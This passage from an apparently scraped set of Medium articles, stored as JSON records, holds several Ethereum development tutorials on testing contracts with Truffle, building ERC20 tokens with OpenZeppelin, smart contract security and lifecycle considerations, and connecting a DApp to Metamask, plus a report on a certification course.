really straightforward and implement a similar syntax to other testing frameworks. You can also read the official Mocha documentation if you want.That said, let\u2019s start with our first test case. We\u2019ll need to create a MyToken.js file inside the test folder. Once you have done that, please paste the next chunk of code into it:const MyToken = artifacts.require('MyToken')contract('MyToken', accounts => {  it('has a total supply and a creator', async function () {    const owner = accounts[0]    const myToken = await MyToken.new({ from: owner })    const creator = await myToken.creator()    const totalSupply = await myToken.totalSupply()    assert(creator === owner)    assert(totalSupply.eq(10000))  })})To run Truffle tests you just need to use the command npx truffle test. Again, there is no need to have running a rpc test node in background since Truffle will do that for you.As you may have noticed, this is the second time we use artifacts.require() in our code. The first time was to write the MyToken migration, and by now you might be wondering what it means. Artifacts are the result of compiling every contract separately. These will be placed in the build/contracts/ directory relative to your project root. Through artifacts.require() is how we tell Truffle which contract we\u2019d like to interact with. Just provide the name of a contract and get an abstraction to use it. You can read more about Truffle artifacts here.The only important thing left is the contract() function, which is really similar to Mocha\u2019s describe() function. This is how Truffle guarantees a clean-room environment, it will redeploy your contracts to your Ethereum client and provide a list of the available accounts in it every time it gets called. We do not recommend using deployed instances of contracts for tests, though. It\u2019s better to have each test manage their own instances.Now that we know some basics about testing with Truffle, let\u2019s add another interesting scenario. We will test token transfers between accounts:it('allows token transfers', async function () {  const owner = accounts[0]  const recipient = accounts[1]  const myToken = await MyToken.new({ from: owner })  await myToken.sendTokens(recipient, 10, { from: owner })  const ownerBalance = await myToken.balanceOf(owner)  assert(ownerBalance.eq(9990))  const recipientBalance = await myToken.balanceOf(recipient)  assert(recipientBalance.eq(10))})Finally, it would be good to add some other edge cases, but I will leave that to you. You can also see how I finished this mini DApp using Truffle with the rest of the test cases here. You\u2019ll see that I just tackled the same features as we did for the app in the previous post. The only thing that changed is that we\u2019re using Truffle to launch a testing node, deploy our contract and add some tests to make sure our contract works the way we expected.3.3. OpenZeppelinIf you got here I\u2019m almost sure you\u2019ve heard about OpenZeppelin. If you haven\u2019t, you just need to know that it is the most used framework that helps you build smart contracts. It is an open-source framework that provides reusable smart contracts to build distributed applications, protocols and organizations, reducing the risk of vulnerabilities by using standard, tested and community-reviewed code.Given the huge amount of token contracts, the Ethereum community created a token standard called ERC20 two years ago. The idea was to allow DApps and wallets to handle tokens across multiple interfaces and DApps in a common way.That said, it is understandable that some of the most used OpenZeppelin contracts are ERC20 implementations. And this is what we are going to do with our MyToken contract as a first step: make it ERC20 compliant. Let\u2019s install the OpenZeppelin framework first, to do so we will need to run:$ npm install zeppelin-solidityNow, take a look at the new implementation we built using some of OpenZeppelin\u2019s contracts:import 'zeppelin-solidity/contracts/token/BasicToken.sol';import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract MyToken is BasicToken, Ownable {  uint256 public constant INITIAL_SUPPLY = 10000;  function MyToken() {    totalSupply = INITIAL_SUPPLY;    balances[msg.sender] = INITIAL_SUPPLY;  }}As you can see we have removed a lot of core functionality. Well, we haven\u2019t removed it, we are just delegating that behavior to the OpenZeppelin contracts. This is really useful since we\u2019re reusing secured and audited code, meaning that we have reduced the attack surface of our contracts.Moreover, you may have noticed that we\u2019re extending our token contract from two OpenZeppelin contracts: Ownable and BasicToken. Yes, Solidity supports multiple inheritance, and it is really important for you to know that order matters. Unfortunately this is out of the scope of this post, but you can learn more about it here.As we said, we are extending MyToken from Ownable. Let\u2019s take a look at this contract:OpenZeppelin Ownable contractOwnable provides three main functionalities:It holds a special address we\u2019ll call its \"owner\",It allows us to transfer the ownership of a contract, andIt provides a useful onlyOwner modifier that will guarantee that a function can only be called by the owner.Pretty useful, isn\u2019t it? On the other hand, we are extending the BasicToken contract too. Let\u2019s see how that one works:OpenZeppelin BasicToken contractI\u2019m sure you are more familiar with this code. It is basically what we were doing inside MyToken contract. There are some minor differences because we were not following the ERC20 standard in the original version. What we called sendTokens here it is just transfer, which implements pretty much the same behaviour besides triggering the Transfer event.Another important thing is the using SafeMath for uint256 line. SafeMath is a library proposed by OpenZeppelin to do mathematical operations with safety checks. This is another of the most used contracts since it guarantees that math operations don\u2019t overflow.OpenZeppelin is a whole world in itself, please take the time to analyze and learn it deeply. You can start by reading and paying careful attention to the security details of the audited and reviewed codebase.We have learned two amazing tools of the Ethereum world that will definitely make your development easier. Truffle will help you testing and deploying, and OpenZeppelin will help you writing secure smart contracts through an audited codebase.Thank you for reading this post, please remember that any question, feedback or suggestions are welcome! If you liked it, stay tuned for the fourth part of this guide, focused on building a real DApp, a token marketplace!Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 7, "tags": ["Ethereum", "Blockchain", "Blockchain Technology", "Solidity", "Zeppelin"]}, {"title": "Certified Ethereum Developer: Building Smart Contracts", "post_link": "https://medium.com/hackernoon/certified-ethereum-developer-building-smart-contracts-3d71a49ad45c?source=search_post", "author_name": "Shaan Ray", "author_link": "https://medium.com/@shaanray", "publish_date": "2017-12-22", "last_modified_date": "2018-10-07", "readtime": "4.57", "claps": 379, "voters": 73, "content": "Certified Ethereum Developer: Building Smart ContractsShaan RayFollowDec 22, 2017 \u00b7 5 min readEthereum is a public blockchain that supports distributed computing and provides smart contract capabilities on its EVM (Ethereum Virtual Machine). Smart contracts will transform several major industries in the coming years. At first glance, the concept of a smart contract seems simple and basic. However, the range and versatility of operations smart contracts offer is incredible.I recently attended the Certified Ethereum Developer (CED) program at York University\u2019s Blockchain Hub in Toronto. This certification program is the first of its kind. It focuses on Solidity, a programming language that runs on the Ethereum blockchain. By the end of the three-day intensive program, the other attendees and I, were able to code our own smart contracts and create tokens. The course also covered topics including ICOs, DAOs, smart property, and other emerging blockchain concepts. The program ends with an exam and a Capstone Project.I teamed up with Ben Brown and Mo Hasan to build smart contracts focused on smart city and government services. Our Capstone Project was a hypothetical municipality that ran its tax collection and municipal services through a series of smart contracts. Even though we completed and submitted the project, we continue to tweak it and add more features.Though I have been in the blockchain space for years, it was exciting to learn and revisit several new topics during CED. Some of these are below:ModularityEthereum is modular and very flexible. A user can tweak the protocol and change several components of it to suit specific organizational needs. Two important such components are:1. Difficulty level \u2014 how difficult do you want to make mining on your network? How much hashing power will it take to solve a block?2. Consensus mechanism \u2014 which consensus mechanism do you want your protocol to follow \u2014 proof of work, proof of stake, or proof of authority?A solidity contract I wrote on the Ethereum\u2019s Remix IDE. This contract performs a simple addition of two numbers. The contract would be triggered externally by someone calling this contract and sending two numbers to be added. On the bottom right of the screen by the addNumber tab I have sent \u20185\u2019 and \u20182\u2019, the result \u20187\u2019 is display next to the getResult tab.Building a blockchainWe worked with GETH and created an internal blockchain for CED attendees. The experience of creating a blockchain from scratch, maintaining it, and participating in transactions on it, was immensely rewarding. It allowed attendees to put their conceptual knowledge into practice. It helped crystallize the following concepts, among others:1. Genesis block \u2014 in the process of creating our genesis block, we assigned values to several variables, including the volume of currency allowed in this particular blockchain, and how much each user was assigned.2. Timestamp \u2014 each block is timestamped with the time at which it was created. Interestingly, Ethereum follows Unix time, which means that it considers the beginning of time to be 00:00:00 UTC Thursday, 1, January 1970 (also known as POSIX time or epoch time).3. Mining \u2014 we used the commands \u2018> mining.start\u2019 or \u2018> mining.stop\u2019 to start or end mining sessions on our cryptocurrency.4. Transacting \u2014 we then used the coins we had mined to transact with one another within our network, and also paid fees in the form of \u2018gas\u2019 to enter data into each block.5. Communicating \u2014 along with sending cryptocurrencies, we were also able to send messages in \u2018string\u2019 form as part of the transaction data. Messages can be sent to inform another peer of various attributes, such as your Status, your current Ethereum State, and node data.Denominations of Ether.Smart ContractsSmart contracts are agreements that are written in code and that are self-executing. They permit transactions to be conducted in a distributed, safe, and transparent environment. (The smart contract concept was first proposed by Nick Szabo in 1994 \u2014 this may be why \u2018szabo\u2019 is a denomination of ether: 1,000,000 szabo = 1 ether.) Some important smart contract concepts include:1. Gas \u2014 this powers each smart contract. Ether can be converted into gas. The gas exists on the Ethereum Virtual Machine. It cannot be traded on other exchanges. The price of gas is not pegged to ETH. Rather, it varies according to a complex algorithm. Executing a transaction or smart contract uses gas. The amount of gas required is proportional to the complexity of the contract.2. Contracts can call on other contracts \u2014 they can call functions of other contracts, and can be programmed to create and deploy other contracts using ether and gas.3. Inheritance \u2014 a contract can be programmed to inherit code from one or more other contracts.4. Calling a contract \u2014 creating and putting a contract on a block is a necessary but separate step from triggering that contract by calling it. The entity calling a contract is known as \u2018msg.sender\u2019, while the entity at the beginning of a call chain is called \u2018tx.origin\u2019. For example, in call chain A > B > C >D > E, \u2018msg.sender\u2019 could be E while \u2018tx.origin\u2019 is A. (n this scenario, A called on smart contract B; B (according to what the contract demanded) called on C, and so on. The immediately previous actor is denoted by \u2018msg.sender\u2019 while the original entity at the very beginning of this chain is called \u2018tx.origin\u2019.Crypto enthusiasts gearing up for the holiday season. Photo credit Hodlmoon.comOverall ImpressionThe instructors who taught this course were experts in their fields and had a broad range of experience in blockchain technology, distributed ledger applications, payment systems, cryptography and entrepreneurship. I found my colleague Aalim Khan to be a gifted programmer who is highly skilled in Solidity and creating smart contracts.While this post highlights some of my thoughts, it only scratches the surface of what the program covers. For brevity\u2019s sake, I omitted several important conceptual (such as creating our own ERC20 tokens) and social (such as making friends among attendees, instructors, and others in the blockchain community) aspects of the program. While coding skills are a definite plus, a basic understanding of programming is enough to learn a ton from this course.", "responses": 3, "tags": ["Blockchain", "Ethereum", "Solidity", "Smart Contracts", "Smart Cities"]}, {"title": "Ethereum Development Walkthrough (Part 3: Security, limitations, and considerations)", "post_link": "https://medium.com/hackernoon/ethereum-development-walkthrough-part-3-security-limitations-and-considerations-d482f05278b4?source=search_post", "author_name": "dev_zl", "author_link": "https://medium.com/@dev_zl", "publish_date": "2018-01-21", "last_modified_date": "2019-04-29", "readtime": "8.75", "claps": 555, "voters": 74, "content": "Ethereum Development Walkthrough (Part 3: Security, limitations, and considerations)dev_zlFollowJan 21, 2018 \u00b7 9 min readThe year is 2023, Dave is an administrator who will soon lose his job because a SaaS Dapp is basically doing it now, and everyone\u2019s in his floor. Still, as an honest worker, he is going to do his job well till the last day. Dave was asked by email to send a sum of ether, and an address to a smart contract\u2019s function.So our guy opens up his Ethereum wallet a.k.a. a word document. He fires myWallets.docx, and finds 4 entries: My secret key, the company\u2019s secret key, my password, the company\u2019s password.He opens Mist, finds the Smart Contract he needs to send ether to, input 1000 ether from the company\u2019s account to the function of the Smart Contract, go back to his emails, and copy the address he must send to the function. But, mistakenly, he doesn\u2019t copy the whole address. He notices his mistake, and complete the address manually, but mistype the last character. Now, it\u2019s a whole new address.Dave presses the send button, copy-past the company\u2019s password, confirm the transaction and the function is executed. Upon executing, that said function send ether to some predefined account addresses, and the rest of ether to the address that Dave typed in, through a self-destructing call, because the developer who wrote it thought it was a good idea to clean out the blockchain from a smart contract that is now useless (Spoiler: You can\u2019t) after the execution of that function.Coincidentally, the mistyped address is the address of a Wrestling contract from the first part of this tutorial, that someone created mistakenly on the mainnet following the second method of the second part of the tutorial.Also, in the same timeline, someone found that Wrestling contract, registered as a second wrestler, put ether in using the Wrestle() function, but the first Wrestler never played his round, and the second wrestler\u2019s ether is forever locked in that Wrestling contract.So in this really improbable scenario(or is it?), ether was lost due to human error, and an incomplete contract.About the Wrestling contractAlthough we implemented the base of our game, we didn\u2019t thought about the life-cycle of the contract. When it\u2019s created, when it\u2019s used, when it isn\u2019t anymore.What if a wrestler never plays after a few rounds? We should give the players the ability to withdraw their money after a certain time, if one of them never plays their round.We also need to think about when a contract will not be used anymore (In our case the end of the wrestling). I said that, in order for a contract to receive ether, we should add the \u201cpayable\u201d keyword to the function that will receive it. But a contract can still receive ether through two methods (and there is nothing you can do to refuse it), when a contract self-destruct(a special, pre-defined function within Solidity that will disable the contract and send all the ether it has to a designed address) to the address of another contract, or when ether is mined to that contract. So, you should always keep a way to take ether from a contract if it ever has more than it should.In our case, since the winner will get all the ether off the contract anyway, we could let him do using an alternative withdraw function, like the following one:It will let him withdraw whatever ether is on the contract, as many times as he wants.When sending money in general, keep in mind that, for some reason, the process could fail, and you should prefer to let the contract\u2019s users withdraw their money than send them directly (like we did with the Wrestling contract).Also, you would think that it\u2019s a good idea, for a contract to self-destruct itself, so you can clean the blockchain, but a contract that was destroyed will remain on the blockchain, and could always receive ether as outlined above.You should also think about a \u201cplan b\u201d, if for some reason, your contract doesn\u2019t behave as expected during production. Because you can\u2019t modify a smart contract once it\u2019s deployed, you may want to keep a sort of lock you can trigger, and it can either pause the transactions of the contract, or send the value it holds to another contract that\u2019ll let the users of the contract withdraw their ether for example. That trigger diminish the decentralization of the contract by giving power to a third party, so it will depend on the use case of your contract, to whether or not use such a system.SecuritySecurity on Solidity starts by following common development patterns, staying up to date with the development of the platform, making your contract bugs free(or at least trying to) through tests, knowing the limitations of the platform, keeping your contract code as simple as possible, and keeping in mind that Ethereum itself(The software behind the blockchain, Solidity compiler etc.) has bugs, and is changing everyday.TestsTests are an important part of any serious development, and if your old methods included waiting for the bugs to show up before fixing them, you are going to have a hard time adapting.Truffle, that we saw in the last part, let us test our contracts in an easy way.Open the project of the last part, fire a couple command-line interfaces, and launch ganache-cli.ganache-cli -p 7545Create a new folder named \u201ctest\u201d, and create a file named \u201cTestExample.js\u201d inside.Paste the following content in it:What it does is, retrieve the Wrestling contract, deploy it to our test network, and try to use the withdraw function. Because no one should be able to use the withdraw function before the game ends, it should return an error because of the \u201crequire\u201d instruction we used inside the withdraw function in our contract.Execute the test on the development console:truffle test --network developmentYou should have a similar output to this:Because executing contract functions is an asynchronous process, you would prefer to use async/await for a cleaner test code. But for the sake of simplicity, our example does the job.An exercise for you would be to simulate a wrestling game, and make sure only the winner can withdraw the ether off the contract at the end (pretty much like we did with the truffle console in the last part).You can see another example of testing in this tutorial. And, don\u2019t hesitate to check Truffle\u2019s documentation.Alternatively, there are some security tools made by the community that can help you when you audit your code. They are listed here.Business logicTesting the functions inside the contract is good, but you should always step backward, and see the interaction between the functions inside your contract, and if you contract, as a whole, is doing what it should do (And nothing else).Keeping your smart contract well-commented is the first step toward a clear, and well-written piece of code (note that the Wrestling.sol contract we saw in the first part is not). The second step would be to keep your contract as simple as possible, and only write in the smart contract the part of your application that needs to be decentralized. If your smart contract will be part of a Dapp (in simple words, a dapp is a web application that have a part of it decentralized* (i.e: A part of it is a smart contract, or it interacts with smart contracts)), make the difference between what needs to be on the blockchain, and what can be handled by the UI, or the backend of the web app.Note*: The definition of a dapp is broader than that, and includes all applications that leverage peer-to-peer interactions. Mist, Bittorrent, Tor etc. are all application that can be called decentralized. See this article by Vitalik Buterin.Know the platformTo really know what you are doing, you should read the docs, there is no way around it, and complete your knowledge by searching on aspects of Solidity development that are not covered in the docs.For example, you should know that fixed-point variable (a.k.a. floats or double) are not fully implemented yet, and a division using the the type \u201cuint\u201d, like 7 / 3, will round down to the nearest integer, in this case 2. So you should not take for granted some things on a platform that is still under heavy development.Because the blockchain is public, everyone could know the information that your variables hold, and you could only try to obfuscate the information within, and not conceal it completely. Same thing for generating a random number or string, anyone who knows how you\u2019ll try to generate the number could potentially craft it. There are actually people trying to figure out the best method to generate random numbers, and you may want to join the fight if that interests you. As I said before, everything is still under development, and there is no industry standards for a lot of things.Time dependent contracts are also a hot point, if your contract would need to run at certain times, you would need to rely on an external application (and keep in mind that it can go down or cease to function at a certain time), because a smart contract cannot trigger itself. If your contract rely on time to judge on certain points, remember that malicious miners could temper with the time a transaction will be executed.Know also that your contract is public, everyone can read it, everyone can interact with it, and if your contract interact or make external calls to other contracts, you have to keep in mind that a malicious contract could temper with the execution of yours.All of this become a bit James Bondy, but when there is a lot of money at stake, people get creative. If your smart contract is running behind a store that sells diapers for old people, you probably wouldn\u2019t need to care that much.Limitations of the platformKnow that the Ethereum platform is not meant for heavy computations, and your transactions are limited by gas. You should keep the logic as simple as possible, and beware of infinite loops, storage limits, value overflow, and all of these little details. Because you can\u2019t remove or modify a contract once it\u2019s on the blockchain, you should consider all these aspects before deploying it.The compiler, and the software behind the Ethereum blockchain are still under development, and undergo continual change, so you should keep that in mind, and stay up to date.Third partiesThere a lot of good actors trying to make the users and developers life easier, and let them access the Ethereum main blockchain without the need to download it locally. Such as MEW, that let you transfer ether and deploy smart contracts, or INFURA that let you access Ethereum blockchain through an API, which is, coupled with truffle, is a solid tool.While there is no doubt about the good intentions of these services, and the skills of the developers behind them, it\u2019s up to you to whether or not seek convenience over security. Platforms like that are always the target of hackers because of the number of transactions they handle, so they will be always a bigger target than a node you set on your machine. At the end, your choice will depend largely on how much money you are moving around and juggling with.Some directions, and where to startBefore leaving you, here are some great materials where you can start your research:A great alternative introduction, in video, would be this one from @KonstantHacker.Common patterns on Solidity docs.Security consid\u00e9rantions on Solidity docs.A more exhaustive document regrouping more recommendations.One thing to keep in mind is, no document can be complete when it comes to security, so you have to research on your own, and use well-thought out and good programming practices.And most of all, start participating, there a lot of project that would need more eyes to find bugs in their code, and there a lot of bounties to grab.And if you find a bug, or discover a better way to do something, don\u2019t hesitate to share your knowledge. Ethereum and the blockchain world follow the open source principles, so the whole community benefit from whatever is discovered or made.The code for this part is available on Github.devzl/ethereum-walkthrough-3ethereum-walkthrough-3 - Repository for the third part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comConclusionAs a conclusion, you really need to get that mindset of a smart contracts developer, and prepare to do a lot of research and tests before launching your contracts into the wild.And as professor Moody says:If you liked this third part, you can find me @dev_zl.In the next part we will see tokens.", "responses": 3, "tags": ["Ethereum", "Security", "Blockchain", "Solidity", "Development"]}, {"title": "Ethereum Development Walkthrough (Part 5: Making a DApp)", "post_link": "https://medium.com/hackernoon/ethereum-development-walkthrough-part-5-making-a-dapp-4c2a3bbcd5e5?source=search_post", "author_name": "dev_zl", "author_link": "https://medium.com/@dev_zl", "publish_date": "2018-02-21", "last_modified_date": "2019-04-29", "readtime": "6.16", "claps": 529, "voters": 68, "content": "Ethereum Development Walkthrough (Part 5: Making a DApp)dev_zlFollowFeb 21, 2018 \u00b7 7 min readIf you have read every part of this tutorial series, you already know how to make a decentralized application on Ethereum, and in this tutorial, I\u2019ll just guide you to use that knowledge together.On Ethereum, a DApp is a web application that will interact with smart contracts deployed on the blockchain. You can do it using python or other programming languages, but these will not be covered in this tutorial. We will focus only on JavaScript.We saw how to make a smart contract, in the first part, and how to deploy it in the second. And in this tutorial, I assumed that you have a JavaScript background, it doesn\u2019t matter how advanced you are, or which frameworks you use, we will use vanilla JavaScript, and a bit of JQuery to make our life easier.One thing that we will need, is, a tool that let us interact with the deployed smart contract, for that, we have a great API named Web3.js.We have seen Web3.js, both on the Truffle console in part 2, and when we performed a test on our contract in part 3.Let\u2019s startCreate a new folder for the project, and run the truffle init command.Next, create a folder named \u201csrc\u201d where we will store our web application files. Inside the folder \u201csrc\u201d, create an \u201cindex.html\u201d file. Paste the following code inside:Create a folder named \u201cJShelpers\u201d, and create the following three files inside:touch jquery.min.js touch truffle-contract.js touch web3.min.jsYou can find their content in the source code for this tutorial on Github.Now, back to the \u201csrc\u201d folder, create a new file named \u201capp.js\u201d. \u201capp.js\u201d will hold our JS logic, we will use a bit of JQuery with vanilla JavaScript to keep it simple, but of course in a real DApp, you can use the frameworks you like, for example React, Angular, Vue etc.Now, open \u201capp.js\u201d, and add the following code:We start by creating some necessary variables, and initializing our Web3 provider variable. We will expect the users to have a web3 provider running. Most users at the moment use Chrome or Firefox, with an extension called \u201cMetamask\u201d to interact with an Ethereum blockchain, so we are expecting Metamask to inject an instance of web3 in the page, if not, we ask the users to install it.Now, let\u2019s implement the necessary functions to interact with our contract, we will start by initializing a reference to the deployed smart contract, creating the function \u2018initWrestlingContract ()\u2019:Then we will create the body of the other functions that will retrieve the informations for us:The \u2018init()\u2019 that launches the execution of all these functions will of course not be executed automatically, so we need to trigger it:Now we will need to complete our html page, modify it so it will look like this:Back to our \u201capp.js\u201d script, we need to add \u2018registerAsSecondWrestler\u2019, the function that will let a user register as a second wrestler :That\u2019s it for our web app! We just need to configure a few things and we are set to go.InstallationsWhile an html document could be opened directly on your browser, the Metamask extension wouldn\u2019t be able to interact with it due to your browser security measure, so we will use a little local http server to serve our files. For that, we will use lite-server:npm init -ynpm install lite-server --save-devCreate file a config file for lite-server named \u2018bs-config.json\u2019 in your project root folder, and paste the following inside:This instructs lite-server to take files from the folder \u201csrc\u201d, where our web app is, and \u201c./build/contracts\u201d where the json files that describe the smart contracts deployed by truffle.Next, add this line:\"dev\": \"lite-server\",To \u2018package.json\u2019 inside the \u201cscripts\u201d node like the following:...  \"scripts\": {    \"dev\": \"lite-server\",    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"  },...Then run the following command inside your console, it should open a page on your browser at \u201chttp://localhost:3000/\u201d:npm run devNow, search for and install Metamask on your browser.The smart contractDon\u2019t forget to deploy a smart contract to your test network. You can find the Wrestling contract in part 1 of this tutorial, and use one of the methods shown in the second part of this tutorial series.For this part, I\u2019ll use Ganache, the UI version, but you can use ganache-cli to simulate the ethereum blockchain.To deploy the smart contract, use truffle migration command:truffle migrate --network developmentDon\u2019t forget to check that your \u201ctruffle-config.js\u201d file is set correctly. And that you added the migration script necessary to deploy it.Configuring MetamaskAfter installing Metamask, click on its icon, then click on the top left of the pop-up, you\u2019ll see a list of different networks, choose the \u201chttp://127.0.0.1:7545\u201d one. If there is no such option, click on the \u201cCustom RPC\u201d option, and add that url, so Metamask can connect with Ganache.Now click on the \u201crestore from seed phrase\u201d option shown in the pop up of Metamask, add copy-past the 12 words of the mnemonic on ganache, and write a password you like.This process will unlock the first account, the one with which we deployed the contract, but for a good simulation, we will use the second account that Ganache generated, so we will have to add it manually to Metamask, click on the user icon on the top right of Metamask, and choose \u201cimport account\u201d, paste the private key that you can copy from the ganache-cli, or click on the key icon on Ganache if you are using the GUI version.Testing the DAppNow that the smart contract is deployed on our test network, that we have our web app set up, and that Metamask is configured, we can test the DApp.Start by going to http://localhost:3000/, the link where lite-server is serving our web app, you\u2019ll see the interface of the web app:The amazing and cutting-edge UI of our DAppMaking sure that the Account 2 is still selected on Metamask, press the \u201cRegister to fight\u201d button, and normally a pop up from Metamask will appear, asking you to confirm the transaction (You can see it also by clicking on the icon of Metamask if it doesn\u2019t pop up).Upon clicking on the submit button, the address of the second wrestler should be replaced by the address of the account that triggered the call (If it doesn\u2019t automatically, refresh the page. If it seems that the transaction fails, check that you followed this tutorial correctly, or that Metamask doesn\u2019t bug, because it did for me when I was writing this tutorial. Most tools around Ethereum are still under development, and we can only thank the developers behind them for the huge effort they put on them).That\u2019s really what a DApp on Ethereum is, there is nothing more to it. For the ones who want to interact with a smart contract in the backend of their DApp, you can of course use Web3.js on NodeJS by installing it with NPM, and using Geth, or infura.io as the provider. Here is a good tutorial that will walk you through that process.Here is the link for the source code for this tutorial:devzl/ethereum-walkthrough-5ethereum-walkthrough-5 - Repository for the 5th part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comHere are an alternative tutorial if you had a hard time following this one. And an other one over here.Going forwardNow, you have all the cards in hands to develop your Ethereum contracts and DApps, read other tutorials on the points that you didn\u2019t understand well, read the documentations of the tools we saw in this project, and of course, practice, a good exercise for you will be to complete the web app of this tutorial, by adding the others functions of the smart contract.You could join the developer community over Reddit, good tidbits are posted there regularly. You can read weekly news of what\u2019s going on in the Ethereum world on the WeekInEthereum website. The ethereum forums are interesting too, and there are pretty active chats on the gitter of Ethereum.This tutorial series ends here, but I\u2019m already pen and paper, preparing another tutorial. Don\u2019t hesitate to follow me so you\u2019ll be notified when it\u2019s out!You can also find me on twitter @dev_zl.", "responses": 9, "tags": ["JavaScript", "Solidity", "Ethereum", "Dapps", "Making A Dapp"]}, {"title": "The Ultimate Guide to Test Your Smart Contract", "post_link": "https://medium.com/ethereum-developers/the-ultimate-guide-to-test-your-smart-contract-ddc65fbb5ba5?source=search_post", "author_name": "Merunas Grincalaitis", "author_link": "https://medium.com/@merunasgrincalaitis", "publish_date": "2018-05-09", "last_modified_date": "2018-10-28", "readtime": "9.80", "claps": 657, "voters": 65, "content": "The Ultimate Guide to Test Your Smart ContractMerunas GrincalaitisFollowMay 9, 2018 \u00b7 10 min readTesting is one of the most important \u2014 yet overlooked \u2014 aspect of the development of smart contract. Whenever you create a smart contract you have to make sure that it\u2019s working properly and testing is the best way for using the contract in different situations without any risk. In this guide, you\u2019ll learn the steps that you need to take to make sure your contracts are safe via testing.Here\u2019s all that you\u2019ll know after finishing this tutorial:How to set up a testing environment with truffleHow to write the tests in javascript and execute them in a test networkThe 5 things that you must test in any contractConclusionNote that you should have at least a medium level of javascript to write tests however you should be able to understand most of what\u2019s going on.1. How to set up a testing environment with truffleThere are lots of different ways to test a smart contract and truffle is the most popular tool for writing tests in javascript that can be executed any time you make a change. This is great when working in a team because you can\u2019t possibly know if a new feature is breaking some existing code.To start, download truffle with the command:npm i -g truffleYou\u2019ll need node.js for executing it so download it from the official website if you haven\u2019t already done so here: https://nodejs.org/en/Then you can go to your project folder from the terminal and execute the command:truffle initWhich will initialize the main files required for your project. Here\u2019s a breakdown of the things that truffle has created for you:contracts/ In this folder is where you\u2019ll store all your smart contracts. They must be here before executing the tests.migrations/ It\u2019s just a folder that will contain specificl files where you can determine how your contracts will be deployed. Don\u2019t worry about this folder since we won\u2019t use it.test/ The main folder where you\u2019ll write all your tests in javascript or solidity. However we\u2019ll stick to javascript only because it\u2019s the fastest and simplest way for testing the contracts.truffle-config.js A configuration file with some parameter that you can change. We won\u2019t use this file.truffle.js Similar to the file above, it contains several configuration parameters.Now that you know what each of those folders and files is doing, you have tomove your smart contracts to the contracts/ folder because they will be used when testing.After doing that, you\u2019re ready to start testing the smart contracts.2. How to write the tests and execute them in a test networkLet\u2019s start right away with the testing. I\u2019ve prepared a sample \u201cnotes\u201d contract which contains some general functions that I want to test. Here\u2019s the code of the contract I\u2019ll be using so you can follow along:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }      uint256 public constant maxAmountOfTodos = 100;   // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;   modifier onlyOwner(address _owner) {      require(msg.sender == _owner);      _;   }   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;      if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }   // Mark a todo as completed   function markTodoAsCompleted(uint256 _todoId) public onlyOwner(todos[msg.sender][_todoId].owner) {      require(_todoId < maxAmountOfTodos);      require(!todos[msg.sender][_todoId].isCompleted);            todos[msg.sender][_todoId].isCompleted = true;   }}It\u2019s just a contract which allows you to store decentralized strings of notes for having a to-do list of things to complete in a day and for keeping yourself accountable.As you can see, there are 2 functions only: addTodo() and markTodoAsCompleted() . In most of the projects you\u2019ll have dozens of functions to test which is simply a longer version of this tutorial.Now I\u2019ve moved this file to the contracts/ folder of my project. Note that I\u2019ve named the file as TodoList.sol which is the name of the contract inside the file. This is important for keeping things simple and organized.After that, go to the test/ folder and create a file called todoList.js note that the first letter is lowercase and that it is a javascript file. The name must be the same as the contract name that you want to test.In this testing file, you start by importing the contract and the library for checking the testing conditions, in my case I\u2019m using assert but you can use should or expect from chai which is a testing framework. Write this in your testing file:const TodoList = artifacts.require('./TodoList.sol')const assert = require('assert')The TodoList variable it just converting the code from the smart contract to use it here. assert is the nodejs library that allows you to check the conditions for each one of your tests.Now I usually create a variable called contractInstance like so:let contractInstanceBelow the assert initialization. The contract instance variable will contain the instance of the contract that you will use later on.Create now the contract container where you\u2019ll test will live:contract('TodoList', (accounts) => {})The name TodoList is just the name of the contract, you can use whatever text you want because that\u2019s just for you to know what is executing at that moment.Add the beforeEach block:contract('TodoList', (accounts) => {   beforeEach(async () => {      contractInstance = await TodoList.deployed()   })})The beforeEach function will be executed before each test and inside it we are just deploying a new TodoList contract with the method deployed() .Now you can add your tests.Each test should verify that a function is working under certain conditions. In this contract I have a function called addTodo that simply adds a string note to the array of notes. So a good starting test would be something like this:contract('TodoList', (accounts) => {   beforeEach(async () => {      contractInstance = await TodoList.deployed()   })   it('should add a to-do note successfully with a short text of 20 letters', async () => {      await contractInstance.addTodo(web3.toHex('this is a short text'))      const newAddedTodo = await contractInstance.todos(accounts[0], 0)      const todoContent = web3.toUtf8(newAddedTodo[1])            assert.equal(todoContent, 'this is a short text', 'The content of the new added todo is not correct')   })})There\u2019s a lot going on but it\u2019s quite simple, here\u2019s the breakdown:Each test starts with the function it() which contains a short, precise description of the test and a callback function. In this case the callback function is async because I want to use the await modifier that will allow me to test more easily with a cleaner code. If you\u2019re not familiar with callbacks, promises and the async/await keywords, check this nice tutorial before continuing: https://medium.com/front-end-hacking/callbacks-promises-and-async-await-ad4756e01d90The web3.toHex() function converts the text to hexadecimal for storing it in the contract.Then I execute the function addTodo() of the contractInstance to start the test. Remember, we want to add a to-do note with a short text and then see if it\u2019s actually stored on the smart contract.The await keyword allows me to wait until the function is done adding the to-do note, otherwise it would continue executing the code while it\u2019s processing in the background.After adding that note, I check the todos variable of the smart contract to see if the note is there. Because the todos variable is public, I can execute it without any additional functions. It receives the address of the owner of the note and the index of the note which in this case is 0, the first one.Because I\u2019m storing the notes in a bytes32 type of variable, the amount of text that I can store is limited to 32 characters and must be a hexadecimal text. So when I try to get the content back, I receive a hexadecimal string made of random numbers and letters like this: 0x74686924852857424513218979854654530000000000 So I\u2019m essentially converting that hexadecimal to a human readable text with the function web3.toUtf8() and storing it in a variable called todoContent .Finally I\u2019m checking if the content of that note that we stored in the smart contract is correct because by default, all the bytes32 have a null hexadecimal value. The assert.equal() function throws an exception whenever the values are not equal, breaking the test, if they are equal 